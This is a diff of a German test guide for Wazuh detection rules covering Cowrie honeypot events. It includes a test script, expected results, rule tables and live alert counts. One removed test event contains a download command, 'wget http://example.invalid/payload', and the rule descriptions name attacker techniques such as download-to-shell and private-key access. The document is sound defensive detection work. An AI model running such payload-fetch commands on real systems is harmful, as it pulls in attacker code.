@@ -1,30 +1,54 @@
 # Regeltests mit `wazuh-logtest`
 
-Jede Regel wurde bzw. wird vor dem Neustart des Wazuh-Managers mit `wazuh-logtest` geprüft,
-statt Regeln „blind" zu ändern.
+Jede Regel hat einen Testfall. Änderungen am Regelwerk werden **vor** dem Neustart des Wazuh-Managers geprüft, statt Regeln „blind" zu ändern.
+
+## Schnellstart (Regelwerk v2)
+
+Auf dem Home-SIEM, nachdem `cowrie_rules.xml` nach `/var/ossec/etc/rules/` kopiert wurde:
 
 ```bash
-sudo /var/ossec/bin/wazuh-logtest
-# eine JSON-Zeile einfügen, Enter; Beenden mit Ctrl+C
+sudo bash wazuh/logtest/run-tests.sh
 ```
 
-## Verifizierte Ergebnisse (Phase 1)
+Das Skript schickt jedes Event aus [`test-events.tsv`](test-events.tsv) einzeln durch den Unit-Test-Modus von `wazuh-logtest` (`-U <rule_id>:<level>:json`) und meldet `PASS`/`FAIL`. Bei einem Fehlschlag zeigt es die tatsächlich ausgelöste Regel-ID. Melden alle Tests `FAIL`, obwohl die angezeigte ID jeweils der erwarteten entspricht, unterstützt die installierte Version den Schalter `-U` nicht. Dann gilt der Vergleich der angezeigten IDs.
 
-### 1. Pipeline-Testregel 110201 (verifiziert)
+Erwartete Ausgabe:
 
-Eingabe:
-
-```json
-{"eventid":"lab.wazuh.test","src_ip":"<HONEYPOT_TAILSCALE_IP>","sensor":"honeypot-vps","username":"root","message":"Wazuh honeypot ingestion test"}
+```text
+PASS  110211 (level 3)
+…
+PASS  110222 (level 6)
+----
+Bestanden: 15  Fehlgeschlagen: 0
 ```
 
-Ausgabe (gekürzt, IP ersetzt):
+| Test | Prüft |
+|---|---|
+| 110211–110213 | Session und Authentifizierung |
+| 110214 | generisches Kommando (`echo xsec`) |
+| 110226 / 110215 / 110223 / 110224 / 110225 | Reihenfolge der Kind-Regeln von 110214 (Discovery, wget/curl, Download-an-Shell, Private Key, chmod) |
+| 110218 | nicht unterstütztes Kommando |
+| 110216 / 110220 | Trennung echter Download (mit `url`) vs. Shell-Umleitung |
+| 110221 | gescheiterter Download |
+| 110217 | SFTP-Upload |
+| 110222 | SSH-Tunnel-/Proxy-Anfrage |
+
+Die Testevents sind **strukturell identisch mit realen Cowrie-Events** aus der Auswertung vom 23.–26.09.2026, aber synthetisch: Quell-IPs aus `203.0.113.0/24` (RFC 5737), URLs auf `example.invalid`, Schlüssel und Passwörter entfernt.
+
+**Nicht enthalten:** die Korrelationsregel 110219 (`frequency`). Manuell testen: `wazuh-logtest` starten und 20 Zeilen `cowrie.login.success` mit derselben `src_ip` nacheinander einfügen. Ab dem 20. Event sollte 110219 auslösen.
+
+**Vorab-Validierung:** Vor der Übergabe wurde das Regelwerk mit einem Python-Modell der Wazuh-Auswertung (erste passende Kind-Regel gewinnt) gegen alle 15 Testfälle (15/15) und gegen die 128.810 realen Events simuliert. Die Trefferzahlen stehen im [README](../../README.md#detection-engineering). Das Modell ersetzt den Test mit dem echten Wazuh-Regelwerk **nicht**. Maßgeblich ist `run-tests.sh`.
+
+---
+
+## Verifizierte Ergebnisse aus Phase 1
+
+### Pipeline-Testregel 110201
 
 ```text
 **Phase 2: Completed decoding.
         name: 'json'
         eventid: 'lab.wazuh.test'
-        message: 'Wazuh honeypot ingestion test'
         sensor: 'honeypot-vps'
         src_ip: '<HONEYPOT_TAILSCALE_IP>'
         username: 'root'
@@ -34,22 +58,12 @@ Ausgabe (gekürzt, IP ersetzt):
         level: '5'
         description: 'Honeypot Wazuh ingestion test from <HONEYPOT_TAILSCALE_IP>'
         groups: '['honeypot', 'cowrie']'
-        firedtimes: '1'
-        mail: 'False'
 **Alert to be generated.
 ```
 
-Der erste Versuch mit den IDs `100200/100201` lieferte stattdessen:
+Der erste Versuch mit den IDs `100200/100201` ergab `WARNING: (7612): Rule ID '100200' is duplicated`. Die IDs kollidierten mit einer älteren Lab-Regel, daher der eigene Bereich `1102xx`.
 
-```text
-** Wazuh-Logtest: WARNING: (7612): Rule ID '100200' is duplicated. Only the first occurrence will be considered.
-```
-
-→ Kollision mit einer bestehenden Regel aus einem früheren Lab; Lösung: eigener ID-Bereich `1102xx`.
-
-### 2. Command-Regel 110214 (live verifiziert)
-
-Reale Alerts aus `/var/ossec/logs/alerts/alerts.json` (lokaler Test, gekürzt):
+### Command-Regel 110214 (live)
 
 ```json
 {"rule":{"level":5,"description":"Cowrie: Command executed by 127.0.0.1: uname -a","id":"110214",
@@ -60,19 +74,20 @@ Reale Alerts aus `/var/ossec/logs/alerts/alerts.json` (lokaler Test, gekürzt):
  "location":"/var/log/honeypot/cowrie.json"}
 ```
 
-Später identisch mit externer Quelle (öffentlicher Test über TCP/22) für `whoami`, `id`, `uname -a`, `pwd`, `exit`.
+Mit Regelwerk v2 fällt genau dieses Kommando unter die spezifischere Discovery-Regel 110226.
 
-## Noch zu verifizieren (Phase 2)
+### Live-Trefferzahlen Regelwerk v1 (23.–26.09.2026)
 
-Die folgenden Testereignisse sind vorbereitet. Ihre Ergebnisse sind im Projektverlauf **nicht belegt**
-und werden in Phase 2 dokumentiert. Die URL verwendet bewusst die reservierte Domain `.invalid`.
+| Regel | Alerts |
+|---|---|
+| 110211 | 15.983 |
+| 110212 | 46 |
+| 110213 | 15.463 |
+| 110214 | 16.854 |
+| 110215 | 10 |
+| 110216 | 772 (sämtlich Shell-Umleitungen → in v2 korrigiert) |
+| 110217 | 3 |
+| 110218 | 770 |
+| 110219 | 0 |
 
-| Regel | Test-Ereignis | Erwartung |
-|---|---|---|
-| 110215 | `{"session":"test123","protocol":"ssh","src_ip":"203.0.113.50","src_port":54321,"dst_ip":"<HONEYPOT_PUBLIC_IP>","dst_port":22,"input":"wget http://example.invalid/payload","eventid":"cowrie.command.input","sensor":"honeypot-vps","timestamp":"2026-09-23T20:30:00Z","message":"CMD: wget http://example.invalid/payload"}` | id `110215`, level `8`, MITRE T1105 |
-| 110213 | `{"session":"test456","protocol":"ssh","src_ip":"203.0.113.51","src_port":54322,"dst_ip":"<HONEYPOT_PUBLIC_IP>","dst_port":22,"username":"root","password":"<REDACTED_PASSWORD>","eventid":"cowrie.login.success","sensor":"honeypot-vps","timestamp":"2026-09-23T20:31:00Z","message":"login attempt succeeded"}` | id `110213`, level `7` (live bereits über das Dashboard belegt) |
-| 110212 | wie oben mit `"eventid":"cowrie.login.failed"` | id `110212`, level `4` |
-| 110219 | 5× `cowrie.login.failed` derselben `src_ip` innerhalb von 120 s | id `110219`, level `8`, MITRE T1110 |
-| 110218 | `sanitized-events.jsonl`, Event `cowrie.command.failed` | id `110218`, level `4` |
-
-`203.0.113.0/24` ist ein Dokumentations-Adressbereich (RFC 5737) und gehört keinem realen System.
+Ermittelt aus den Wazuh-Alert-Archiven abzüglich der doppelt gezählten Tagesdatei (siehe [`docs/attack-statistics.md`](../../docs/attack-statistics.md#6-methodischer-hinweis-doppelzählung-bei-wazuh-archiven)).
